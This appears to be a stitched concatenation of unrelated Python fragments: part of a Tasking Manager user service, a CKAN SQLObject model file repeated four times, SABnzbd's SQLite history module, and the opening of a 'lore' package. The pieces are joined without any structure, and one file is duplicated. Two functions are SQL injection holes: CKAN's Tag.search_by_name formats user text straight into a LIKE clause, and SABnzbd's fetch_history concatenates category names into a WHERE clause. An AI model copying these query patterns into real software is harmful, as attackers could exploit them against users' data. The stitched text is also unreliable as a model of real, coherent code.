    def has_user_accepted_license(user_id: int, license_id: int):
        """ Checks if user has accepted specified license """
        user = UserService.get_user_by_id(user_id)
        return user.has_user_accepted_licence(license_id)

    @staticmethod
    def get_osm_details_for_user(username: str) -> UserOSMDTO:
        """
        Gets OSM details for the user from OSM API
        :param username: username in scope
        :raises UserServiceError, NotFound
        """
        user = UserService.get_user_by_username(username)
        osm_dto = OSMService.get_osm_details_for_user(user.id)
        return osm_dto

    @staticmethod
    def check_and_update_mapper_level(user_id: int):
        """ Check users mapping level and update if they have crossed threshold """
        user = UserService.get_user_by_id(user_id)
        user_level = MappingLevel(user.mapping_level)

        if user_level == MappingLevel.ADVANCED:
            return  # User has achieved highest level, so no need to do further checking

        intermediate_level = current_app.config['MAPPER_LEVEL_INTERMEDIATE']
        advanced_level = current_app.config['MAPPER_LEVEL_ADVANCED']

        try:
            osm_details = OSMService.get_osm_details_for_user(user_id)
            if (osm_details.changeset_count > advanced_level and
                user.mapping_level !=  MappingLevel.ADVANCED.value):
                user.mapping_level = MappingLevel.ADVANCED.value
                UserService.notify_level_upgrade(user_id, user.username, 'ADVANCED')
            elif (intermediate_level < osm_details.changeset_count < advanced_level and
                user.mapping_level != MappingLevel.INTERMEDIATE.value):
                user.mapping_level = MappingLevel.INTERMEDIATE.value
                UserService.notify_level_upgrade(user_id, user.username, 'INTERMEDIATE')
        except OSMServiceError:
            # Swallow exception as we don't want to blow up the server for this
            current_app.logger.error('Error attempting to update mapper level')
            return


        user.save()
        return user

    def notify_level_upgrade(user_id: int, username: str, level: str):
        text_template = get_template('level_upgrade_message_en.txt')

        if username is not None:
            text_template = text_template.replace('[USERNAME]', username)

        text_template = text_template.replace('[LEVEL]', level)
        level_upgrade_message = Message()
        level_upgrade_message.to_user_id = user_id
        level_upgrade_message.subject = 'Mapper Level Upgrade '
        level_upgrade_message.message = text_template
        level_upgrade_message.save()


    @staticmethod
    def refresh_mapper_level() -> int:
        """ Helper function to run thru all users in the DB and update their mapper level """
        users = User.get_all_users_not_pagainated()
        users_updated = 1
        total_users = len(users)

        for user in users:
            UserService.check_and_update_mapper_level(user.id)

            if users_updated % 50 == 0:
                print(f'{users_updated} users updated of {total_users}')

            users_updated += 1

        return users_updated

import sqlobject

try:
    # vdm >= 0.2
    import vdm.sqlobject.base as vdmbase
    from vdm.sqlobject.base import State
except:
    # vdm == 0.1
    import vdm.base as vdmbase
    from vdm.base import State

# American spelling ...
class License(sqlobject.SQLObject):

    class sqlmeta:
        _defaultOrder = 'name'

    name = sqlobject.UnicodeCol(alternateID=True)
    packages = sqlobject.MultipleJoin('Package')


class PackageRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Package', cascade=True)
    title = sqlobject.UnicodeCol(default=None)
    url = sqlobject.UnicodeCol(default=None)
    download_url = sqlobject.UnicodeCol(default=None)
    license = sqlobject.ForeignKey('License', default=None)
    notes = sqlobject.UnicodeCol(default=None)


class TagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Tag', cascade=True)


class PackageTagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('PackageTag', cascade=True)


class Package(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    
    name = sqlobject.UnicodeCol(alternateID=True)

    # should be attribute_name, module_name, module_object
    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]

    def add_tag_by_name(self, tagname):
        try:
            tag = self.revision.model.tags.get(tagname)
        except: # TODO: make this specific
            tag = self.transaction.model.tags.create(name=tagname)
        self.tags.create(tag=tag)


class Tag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = TagRevision

    name = sqlobject.UnicodeCol(alternateID=True)
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)

    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]

    @classmethod
    def search_by_name(self, text_query):
        text_query_str = str(text_query) # SQLObject chokes on unicode.                    
        # Todo: Change to use SQLObject statement objects.
        sql_query = "UPPER(tag.name) LIKE UPPER('%%%s%%')" % text_query_str                    
        return self.select(sql_query)


class PackageTag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageTagRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    m2m = []

    package = sqlobject.ForeignKey('Package', cascade=True)
    tag = sqlobject.ForeignKey('Tag', cascade=True)

    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',
            unique=True)


import sqlobject

try:
    # vdm >= 0.2
    import vdm.sqlobject.base as vdmbase
    from vdm.sqlobject.base import State
except:
    # vdm == 0.1
    import vdm.base as vdmbase
    from vdm.base import State

# American spelling ...
class License(sqlobject.SQLObject):

    class sqlmeta:
        _defaultOrder = 'name'

    name = sqlobject.UnicodeCol(alternateID=True)
    packages = sqlobject.MultipleJoin('Package')


class PackageRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Package', cascade=True)
    title = sqlobject.UnicodeCol(default=None)
    url = sqlobject.UnicodeCol(default=None)
    download_url = sqlobject.UnicodeCol(default=None)
    license = sqlobject.ForeignKey('License', default=None)
    notes = sqlobject.UnicodeCol(default=None)


class TagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Tag', cascade=True)


class PackageTagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('PackageTag', cascade=True)


class Package(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    
    name = sqlobject.UnicodeCol(alternateID=True)

    # should be attribute_name, module_name, module_object
    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]

    def add_tag_by_name(self, tagname):
        try:
            tag = self.revision.model.tags.get(tagname)
        except: # TODO: make this specific
            tag = self.transaction.model.tags.create(name=tagname)
        self.tags.create(tag=tag)


class Tag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = TagRevision

    name = sqlobject.UnicodeCol(alternateID=True)
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)

    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]

    @classmethod
    def search_by_name(self, text_query):
        text_query_str = str(text_query) # SQLObject chokes on unicode.                    
        # Todo: Change to use SQLObject statement objects.
        sql_query = "UPPER(tag.name) LIKE UPPER('%%%s%%')" % text_query_str                    
        return self.select(sql_query)


class PackageTag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageTagRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    m2m = []

    package = sqlobject.ForeignKey('Package', cascade=True)
    tag = sqlobject.ForeignKey('Tag', cascade=True)

    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',
            unique=True)


import sqlobject

try:
    # vdm >= 0.2
    import vdm.sqlobject.base as vdmbase
    from vdm.sqlobject.base import State
except:
    # vdm == 0.1
    import vdm.base as vdmbase
    from vdm.base import State

# American spelling ...
class License(sqlobject.SQLObject):

    class sqlmeta:
        _defaultOrder = 'name'

    name = sqlobject.UnicodeCol(alternateID=True)
    packages = sqlobject.MultipleJoin('Package')


class PackageRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Package', cascade=True)
    title = sqlobject.UnicodeCol(default=None)
    url = sqlobject.UnicodeCol(default=None)
    download_url = sqlobject.UnicodeCol(default=None)
    license = sqlobject.ForeignKey('License', default=None)
    notes = sqlobject.UnicodeCol(default=None)


class TagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Tag', cascade=True)


class PackageTagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('PackageTag', cascade=True)


class Package(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    
    name = sqlobject.UnicodeCol(alternateID=True)

    # should be attribute_name, module_name, module_object
    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]

    def add_tag_by_name(self, tagname):
        try:
            tag = self.revision.model.tags.get(tagname)
        except: # TODO: make this specific
            tag = self.transaction.model.tags.create(name=tagname)
        self.tags.create(tag=tag)


class Tag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = TagRevision

    name = sqlobject.UnicodeCol(alternateID=True)
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)

    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]

    @classmethod
    def search_by_name(self, text_query):
        text_query_str = str(text_query) # SQLObject chokes on unicode.                    
        # Todo: Change to use SQLObject statement objects.
        sql_query = "UPPER(tag.name) LIKE UPPER('%%%s%%')" % text_query_str                    
        return self.select(sql_query)


class PackageTag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageTagRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    m2m = []

    package = sqlobject.ForeignKey('Package', cascade=True)
    tag = sqlobject.ForeignKey('Tag', cascade=True)

    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',
            unique=True)


import sqlobject

try:
    # vdm >= 0.2
    import vdm.sqlobject.base as vdmbase
    from vdm.sqlobject.base import State
except:
    # vdm == 0.1
    import vdm.base as vdmbase
    from vdm.base import State

# American spelling ...
class License(sqlobject.SQLObject):

    class sqlmeta:
        _defaultOrder = 'name'

    name = sqlobject.UnicodeCol(alternateID=True)
    packages = sqlobject.MultipleJoin('Package')


class PackageRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Package', cascade=True)
    title = sqlobject.UnicodeCol(default=None)
    url = sqlobject.UnicodeCol(default=None)
    download_url = sqlobject.UnicodeCol(default=None)
    license = sqlobject.ForeignKey('License', default=None)
    notes = sqlobject.UnicodeCol(default=None)


class TagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Tag', cascade=True)


class PackageTagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('PackageTag', cascade=True)


class Package(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    
    name = sqlobject.UnicodeCol(alternateID=True)

    # should be attribute_name, module_name, module_object
    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]

    def add_tag_by_name(self, tagname):
        try:
            tag = self.revision.model.tags.get(tagname)
        except: # TODO: make this specific
            tag = self.transaction.model.tags.create(name=tagname)
        self.tags.create(tag=tag)


class Tag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = TagRevision

    name = sqlobject.UnicodeCol(alternateID=True)
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)

    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]

    @classmethod
    def search_by_name(self, text_query):
        text_query_str = str(text_query) # SQLObject chokes on unicode.                    
        # Todo: Change to use SQLObject statement objects.
        sql_query = "UPPER(tag.name) LIKE UPPER('%%%s%%')" % text_query_str                    
        return self.select(sql_query)


class PackageTag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageTagRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    m2m = []

    package = sqlobject.ForeignKey('Package', cascade=True)
    tag = sqlobject.ForeignKey('Tag', cascade=True)

    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',
            unique=True)


import sqlobject

try:
    # vdm >= 0.2
    import vdm.sqlobject.base as vdmbase
    from vdm.sqlobject.base import State
except:
    # vdm == 0.1
    import vdm.base as vdmbase
    from vdm.base import State

# American spelling ...
class License(sqlobject.SQLObject):

    class sqlmeta:
        _defaultOrder = 'name'

    name = sqlobject.UnicodeCol(alternateID=True)
    packages = sqlobject.MultipleJoin('Package')


class PackageRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Package', cascade=True)
    title = sqlobject.UnicodeCol(default=None)
    url = sqlobject.UnicodeCol(default=None)
    download_url = sqlobject.UnicodeCol(default=None)
    license = sqlobject.ForeignKey('License', default=None)
    notes = sqlobject.UnicodeCol(default=None)


class TagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Tag', cascade=True)


class PackageTagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('PackageTag', cascade=True)


class Package(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    
    name = sqlobject.UnicodeCol(alternateID=True)

    # should be attribute_name, module_name, module_object
    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]

    def add_tag_by_name(self, tagname):
        try:
            tag = self.revision.model.tags.get(tagname)
        except: # TODO: make this specific
            tag = self.transaction.model.tags.create(name=tagname)
        self.tags.create(tag=tag)


class Tag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = TagRevision

    name = sqlobject.UnicodeCol(alternateID=True)
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)

    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]

    @classmethod
    def search_by_name(self, text_query):
        text_query_str = str(text_query) # SQLObject chokes on unicode.                    
        # Todo: Change to use SQLObject statement objects.
        sql_query = "UPPER(tag.name) LIKE UPPER('%%%s%%')" % text_query_str                    
        return self.select(sql_query)


class PackageTag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageTagRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    m2m = []

    package = sqlobject.ForeignKey('Package', cascade=True)
    tag = sqlobject.ForeignKey('Tag', cascade=True)

    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',
            unique=True)


#!/usr/bin/python -OO
# Copyright 2008-2017 The SABnzbd-Team <team@sabnzbd.org>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

"""
sabnzbd.database - Database Support
"""

try:
    import sqlite3
except:
    try:
        import pysqlite2.dbapi2 as sqlite3
    except:
        pass

import os
import time
import zlib
import logging
import sys
import threading

import sabnzbd
import sabnzbd.cfg
from sabnzbd.constants import DB_HISTORY_NAME, STAGES
from sabnzbd.encoding import unicoder
from sabnzbd.bpsmeter import this_week, this_month
from sabnzbd.decorators import synchronized
from sabnzbd.misc import get_all_passwords, int_conv

DB_LOCK = threading.RLock()


def convert_search(search):
    """ Convert classic wildcard to SQL wildcard """
    if not search:
        # Default value
        search = ''
    else:
        # Allow * for wildcard matching and space
        search = search.replace('*', '%').replace(' ', '%')

    # Allow ^ for start of string and $ for end of string
    if search and search.startswith('^'):
        search = search.replace('^', '')
        search += '%'
    elif search and search.endswith('$'):
        search = search.replace('$', '')
        search = '%' + search
    else:
        search = '%' + search + '%'
    return search


class HistoryDB(object):
    """ Class to access the History database
        Each class-instance will create an access channel that
        can be used in one thread.
        Each thread needs its own class-instance!
    """
    # These class attributes will be accessed directly because
    # they need to be shared by all instances
    db_path = None        # Will contain full path to history database
    done_cleaning = False # Ensure we only do one Vacuum per session

    @synchronized(DB_LOCK)
    def __init__(self):
        """ Determine databse path and create connection """
        self.con = self.c = None
        if not HistoryDB.db_path:
            HistoryDB.db_path = os.path.join(sabnzbd.cfg.admin_dir.get_path(), DB_HISTORY_NAME)
        self.connect()


    def connect(self):
        """ Create a connection to the database """
        create_table = not os.path.exists(HistoryDB.db_path)
        self.con = sqlite3.connect(HistoryDB.db_path)
        self.con.row_factory = dict_factory
        self.c = self.con.cursor()
        if create_table:
            self.create_history_db()
        elif not HistoryDB.done_cleaning:
            # Run VACUUM on sqlite
            # When an object (table, index, or trigger) is dropped from the database, it leaves behind empty space
            # http://www.sqlite.org/lang_vacuum.html
            HistoryDB.done_cleaning = True
            self.execute('VACUUM')

        self.execute('PRAGMA user_version;')
        try:
            version = self.c.fetchone()['user_version']
        except TypeError:
            version = 0
        if version < 1:
            # Add any missing columns added since first DB version
            # Use "and" to stop when database has been reset due to corruption
            _ = self.execute('PRAGMA user_version = 1;') and \
                self.execute('ALTER TABLE "history" ADD COLUMN series TEXT;') and \
                self.execute('ALTER TABLE "history" ADD COLUMN md5sum TEXT;')
        if version < 2:
            # Add any missing columns added since second DB version
            # Use "and" to stop when database has been reset due to corruption
            _ = self.execute('PRAGMA user_version = 2;') and \
                self.execute('ALTER TABLE "history" ADD COLUMN password TEXT;')


    def execute(self, command, args=(), save=False):
        ''' Wrapper for executing SQL commands '''
        for tries in xrange(5, 0, -1):
            try:
                if args and isinstance(args, tuple):
                    self.c.execute(command, args)
                else:
                    self.c.execute(command)
                if save:
                    self.save()
                return True
            except:
                error = str(sys.exc_value)
                if tries >= 0 and 'is locked' in error:
                    logging.debug('Database locked, wait and retry')
                    time.sleep(0.5)
                    continue
                elif 'readonly' in error:
                    logging.error(T('Cannot write to History database, check access rights!'))
                    # Report back success, because there's no recovery possible
                    return True
                elif 'not a database' in error or 'malformed' in error or 'duplicate column name' in error:
                    logging.error(T('Damaged History database, created empty replacement'))
                    logging.info("Traceback: ", exc_info=True)
                    self.close()
                    try:
                        os.remove(HistoryDB.db_path)
                    except:
                        pass
                    self.connect()
                    # Return False in case of "duplicate column" error
                    # because the column addition in connect() must be terminated
                    return 'duplicate column name' not in error
                else:
                    logging.error(T('SQL Command Failed, see log'))
                    logging.debug("SQL: %s", command)                    
                    logging.info("Traceback: ", exc_info=True)
                    try:
                        self.con.rollback()
                    except:
                        logging.debug("Rollback Failed:", exc_info=True)
            return False

    def create_history_db(self):
        """ Create a new (empty) database file """
        self.execute("""
        CREATE TABLE "history" (
            "id" INTEGER PRIMARY KEY,
            "completed" INTEGER NOT NULL,
            "name" TEXT NOT NULL,
            "nzb_name" TEXT NOT NULL,
            "category" TEXT,
            "pp" TEXT,
            "script" TEXT,
            "report" TEXT,
            "url" TEXT,
            "status" TEXT,
            "nzo_id" TEXT,
            "storage" TEXT,
            "path" TEXT,
            "script_log" BLOB,
            "script_line" TEXT,
            "download_time" INTEGER,
            "postproc_time" INTEGER,
            "stage_log" TEXT,
            "downloaded" INTEGER,
            "completeness" INTEGER,
            "fail_message" TEXT,
            "url_info" TEXT,
            "bytes" INTEGER,
            "meta" TEXT,
            "series" TEXT,
            "md5sum" TEXT,
            "password" TEXT
        )
        """)
        self.execute('PRAGMA user_version = 2;')

    def save(self):
        """ Save database to disk """
        try:
            self.con.commit()
        except:
            logging.error(T('SQL Commit Failed, see log'))
            logging.info("Traceback: ", exc_info=True)

    def close(self):
        """ Close database connection """
        try:
            self.c.close()
            self.con.close()
        except:
            logging.error(T('Failed to close database, see log'))
            logging.info("Traceback: ", exc_info=True)

    def remove_completed(self, search=None):
        """ Remove all completed jobs from the database, optional with `search` pattern """
        search = convert_search(search)                    
        logging.info('Removing all completed jobs from history')
        return self.execute("""DELETE FROM history WHERE name LIKE ? AND status = 'Completed'""", (search,), save=True)

    def get_failed_paths(self, search=None):
        """ Return list of all storage paths of failed jobs (may contain non-existing or empty paths) """
        search = convert_search(search)                    
        fetch_ok = self.execute("""SELECT path FROM history WHERE name LIKE ? AND status = 'Failed'""", (search,))
        if fetch_ok:
            return [item.get('path') for item in self.c.fetchall()]
        else:
            return []

    def remove_failed(self, search=None):
        """ Remove all failed jobs from the database, optional with `search` pattern """
        search = convert_search(search)                    
        logging.info('Removing all failed jobs from history')
        return self.execute("""DELETE FROM history WHERE name LIKE ? AND status = 'Failed'""", (search,), save=True)

    def remove_history(self, jobs=None):
        """ Remove all jobs in the list `jobs`, empty list will remove all completed jobs """
        if jobs is None:
            self.remove_completed()
        else:
            if not isinstance(jobs, list):
                jobs = [jobs]

            for job in jobs:
                self.execute("""DELETE FROM history WHERE nzo_id=?""", (job,))
                logging.info('Removing job %s from history', job)

        self.save()

    def auto_history_purge(self):
        """ Remove history items based on the configured history-retention """
        if sabnzbd.cfg.history_retention() == "0":
            return

        if sabnzbd.cfg.history_retention() == "-1":
            # Delete all non-failed ones
            self.remove_completed()

        if "d" in sabnzbd.cfg.history_retention():
            # How many days to keep?
            days_to_keep = int_conv(sabnzbd.cfg.history_retention().strip()[:-1])
            seconds_to_keep = int(time.time()) - days_to_keep*3600*24
            if days_to_keep > 0:
                logging.info('Removing completed jobs older than %s days from history', days_to_keep)
                return self.execute("""DELETE FROM history WHERE status = 'Completed' AND completed < ?""", (seconds_to_keep,), save=True)
        else:
            # How many to keep?
            to_keep = int_conv(sabnzbd.cfg.history_retention())
            if to_keep > 0:
                logging.info('Removing all but last %s completed jobs from history', to_keep)
                return self.execute("""DELETE FROM history WHERE id NOT IN ( SELECT id FROM history WHERE status = 'Completed' ORDER BY completed DESC LIMIT ? )""", (to_keep,), save=True)


    def add_history_db(self, nzo, storage, path, postproc_time, script_output, script_line):
        """ Add a new job entry to the database """
        t = build_history_info(nzo, storage, path, postproc_time, script_output, script_line)

        if self.execute("""INSERT INTO history (completed, name, nzb_name, category, pp, script, report,
        url, status, nzo_id, storage, path, script_log, script_line, download_time, postproc_time, stage_log,
        downloaded, completeness, fail_message, url_info, bytes, series, md5sum, password)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""", t):
            self.save()
        logging.info('Added job %s to history', nzo.final_name)

    def fetch_history(self, start=None, limit=None, search=None, failed_only=0, categories=None):
        """ Return records for specified jobs """
        search = convert_search(search)                    

        post = ''
        if categories:
            categories = ['*' if c == 'Default' else c for c in categories]
            post = " AND (CATEGORY = '"                    
            post += "' OR CATEGORY = '".join(categories)                    
            post += "' )"                    
        if failed_only:
            post += ' AND STATUS = "Failed"'

        cmd = 'SELECT COUNT(*) FROM history WHERE name LIKE ?'
        res = self.execute(cmd + post, (search,))                    
        total_items = -1
        if res:
            try:
                total_items = self.c.fetchone().get('COUNT(*)')
            except AttributeError:
                pass

        if not start:
            start = 0
        if not limit:
            limit = total_items

        t = (search, start, limit)                    
        cmd = 'SELECT * FROM history WHERE name LIKE ?'
        fetch_ok = self.execute(cmd + post + ' ORDER BY completed desc LIMIT ?, ?', t)                    

        if fetch_ok:
            items = self.c.fetchall()
        else:
            items = []

        fetched_items = len(items)

        # Unpack the single line stage log
        # Stage Name is separated by ::: stage lines by ; and stages by \r\n
        items = [unpack_history_info(item) for item in items]

        return (items, fetched_items, total_items)

    def have_episode(self, series, season, episode):
        """ Check whether History contains this series episode """
        total = 0
        series = series.lower().replace('.', ' ').replace('_', ' ').replace('  ', ' ')
        if series and season and episode:
            pattern = '%s/%s/%s' % (series, season, episode)
            res = self.execute("select count(*) from History WHERE series = ? AND STATUS != 'Failed'", (pattern,))
            if res:
                try:
                    total = self.c.fetchone().get('count(*)')
                except AttributeError:
                    pass
        return total > 0

    def have_md5sum(self, md5sum):
        """ Check whether this md5sum already in History """
        total = 0
        res = self.execute("select count(*) from History WHERE md5sum = ? AND STATUS != 'Failed'", (md5sum,))
        if res:
            try:
                total = self.c.fetchone().get('count(*)')
            except AttributeError:
                pass
        return total > 0

    def get_history_size(self):
        """ Returns the total size of the history and
            amounts downloaded in the last month and week
        """
        # Total Size of the history
        total = 0
        if self.execute('''SELECT sum(bytes) FROM history'''):
            try:
                total = self.c.fetchone().get('sum(bytes)')
            except AttributeError:
                pass

        # Amount downloaded this month
        # r = time.gmtime(time.time())
        # month_timest = int(time.mktime((r.tm_year, r.tm_mon, 0, 0, 0, 1, r.tm_wday, r.tm_yday, r.tm_isdst)))
        month_timest = int(this_month(time.time()))

        month = 0
        if self.execute('''SELECT sum(bytes) FROM history WHERE "completed">?''', (month_timest,)):
            try:
                month = self.c.fetchone().get('sum(bytes)')
            except AttributeError:
                pass

        # Amount downloaded this week
        week_timest = int(this_week(time.time()))

        week = 0
        if self.execute('''SELECT sum(bytes) FROM history WHERE "completed">?''', (week_timest,)):
            try:
                week = self.c.fetchone().get('sum(bytes)')
            except AttributeError:
                pass

        return (total, month, week)

    def get_script_log(self, nzo_id):
        """ Return decompressed log file """
        data = ''
        t = (nzo_id,)
        if self.execute('SELECT script_log FROM history WHERE nzo_id=?', t):
            try:
                data = zlib.decompress(self.c.fetchone().get('script_log'))
            except:
                pass
        return data

    def get_name(self, nzo_id):
        """ Return name of the job `nzo_id` """
        t = (nzo_id,)
        name = ''
        if self.execute('SELECT name FROM history WHERE nzo_id=?', t):
            try:
                name = self.c.fetchone().get('name')
            except AttributeError:
                pass
        return name

    def get_path(self, nzo_id):
        """ Return the `incomplete` path of the job `nzo_id` """
        t = (nzo_id,)
        path = ''
        if self.execute('SELECT path FROM history WHERE nzo_id=?', t):
            try:
                path = self.c.fetchone().get('path')
            except AttributeError:
                pass
        return path

    def get_other(self, nzo_id):
        """ Return additional data for job `nzo_id` """
        t = (nzo_id,)
        if self.execute('SELECT * FROM history WHERE nzo_id=?', t):
            try:
                items = self.c.fetchall()[0]
                dtype = items.get('report')
                url = items.get('url')
                pp = items.get('pp')
                script = items.get('script')
                cat = items.get('category')
            except (AttributeError, IndexError):
                return '', '', '', '', ''
        return dtype, url, pp, script, cat


def dict_factory(cursor, row):
    """ Return a dictionary for the current database position """
    d = {}
    for idx, col in enumerate(cursor.description):
        d[col[0]] = row[idx]
    return d


_PP_LOOKUP = {0: '', 1: 'R', 2: 'U', 3: 'D'}
def build_history_info(nzo, storage='', downpath='', postproc_time=0, script_output='', script_line=''):
    """ Collects all the information needed for the database """

    if not downpath:
        downpath = nzo.downpath
    path = decode_factory(downpath)
    storage = decode_factory(storage)
    script_line = decode_factory(script_line)

    flagRepair, flagUnpack, flagDelete = nzo.repair_opts
    nzo_info = decode_factory(nzo.nzo_info)

    url = decode_factory(nzo.url)

    completed = int(time.time())
    name = decode_factory(nzo.final_name)

    nzb_name = decode_factory(nzo.filename)
    category = decode_factory(nzo.cat)
    pp = _PP_LOOKUP.get(sabnzbd.opts_to_pp(flagRepair, flagUnpack, flagDelete), 'X')
    script = decode_factory(nzo.script)
    status = decode_factory(nzo.status)
    nzo_id = nzo.nzo_id
    bytes = nzo.bytes_downloaded

    if script_output:
        # Compress the output of the script
        script_log = sqlite3.Binary(zlib.compress(script_output))
        #
    else:
        script_log = ''

    download_time = decode_factory(nzo_info.get('download_time', 0))

    downloaded = nzo.bytes_downloaded
    completeness = 0
    fail_message = decode_factory(nzo.fail_msg)
    url_info = nzo_info.get('details', '') or nzo_info.get('more_info', '')

    # Get the dictionary containing the stages and their unpack process
    stages = decode_factory(nzo.unpack_info)
    # Pack the dictionary up into a single string
    # Stage Name is separated by ::: stage lines by ; and stages by \r\n
    lines = []
    for key, results in stages.iteritems():
        lines.append('%s:::%s' % (key, ';'.join(results)))
    stage_log = '\r\n'.join(lines)

    # Reuse the old 'report' column to indicate a URL-fetch
    report = 'future' if nzo.futuretype else ''

    # Analyze series info only when job is finished
    series = u''
    if postproc_time:
        seriesname, season, episode, dummy = sabnzbd.newsunpack.analyse_show(nzo.final_name)
        if seriesname and season and episode:
            series = u'%s/%s/%s' % (seriesname.lower(), season, episode)

    # See whatever the first password was, for the Retry
    password = ''
    passwords = get_all_passwords(nzo)
    if passwords:
        password = passwords[0]

    return (completed, name, nzb_name, category, pp, script, report, url, status, nzo_id, storage, path,
            script_log, script_line, download_time, postproc_time, stage_log, downloaded, completeness,
            fail_message, url_info, bytes, series, nzo.md5sum, password)



def unpack_history_info(item):
    """ Expands the single line stage_log from the DB
        into a python dictionary for use in the history display
    """
    # Stage Name is separated by ::: stage lines by ; and stages by \r\n
    lst = item['stage_log']
    if lst:
        try:
            lines = lst.split('\r\n')
        except:
            logging.error(T('Invalid stage logging in history for %s') + ' (\\r\\n)', unicoder(item['name']))
            logging.debug('Lines: %s', lst)
            lines = []
        lst = [None for x in STAGES]
        for line in lines:
            stage = {}
            try:
                key, logs = line.split(':::')
            except:
                logging.debug('Missing key:::logs "%s"', line)
                key = line
                logs = ''
            stage['name'] = key
            stage['actions'] = []
            try:
                logs = logs.split(';')
            except:
                logging.error(T('Invalid stage logging in history for %s') + ' (;)', unicoder(item['name']))
                logging.debug('Logs: %s', logs)
                logs = []
            for log in logs:
                stage['actions'].append(log)
            try:
                lst[STAGES[key]] = stage
            except KeyError:
                lst.append(stage)
        # Remove unused stages
        item['stage_log'] = [x for x in lst if x is not None]

    if item['script_log']:
        item['script_log'] = ''
    # The action line is only available for items in the postproc queue
    if 'action_line' not in item:
        item['action_line'] = ''
    return item


def midnight_history_purge():
    logging.info('Scheduled history purge')
    history_db = HistoryDB()
    history_db.auto_history_purge()
    history_db.close()


def decode_factory(text):
    """ Recursively looks through the supplied argument
        and converts and text to Unicode
    """
    if isinstance(text, str):
        return unicoder(text)

    elif isinstance(text, list):
        new_text = []
        for t in text:
            new_text.append(decode_factory(t))
        return new_text

    elif isinstance(text, dict):
        new_text = {}
        for key in text:
            new_text[key] = decode_factory(text[key])
        return new_text
    else:
        return text

# -*- coding: utf-8 -*-
from __future__ import absolute_import

import logging
import os
import sys
import atexit

from lore import env, util, ansi
from lore.ansi import underline
from lore.util import timer

logger = logging.getLogger(__name__)

if not (sys.version_info.major == 3 and sys.version_info.minor >= 6):
    ModuleNotFoundError = ImportError


__author__ = 'Montana Low and Jeremy Stanley'
